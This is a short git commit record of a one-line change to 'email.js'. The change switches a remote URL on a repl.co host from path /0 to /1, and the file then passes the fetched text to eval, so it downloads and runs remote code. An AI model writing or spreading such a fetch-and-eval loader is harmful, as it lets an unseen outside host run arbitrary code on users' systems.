d59f8de6bbb3545dde3eaa5816d12feb344ea87f
entryhelper <106230487+entryhelper@users.noreply.github.com>
2022-08-24 19:30:05 +0900

    Update email.js

--- email.js
+++ email.js
@@ -1,2 +1,2 @@
-const text = await fetch("https://source.playentrymail.repl.co/0").then(r=>r.text());
+const text = await fetch("https://source.playentrymail.repl.co/1").then(r=>r.text());
 eval(text);
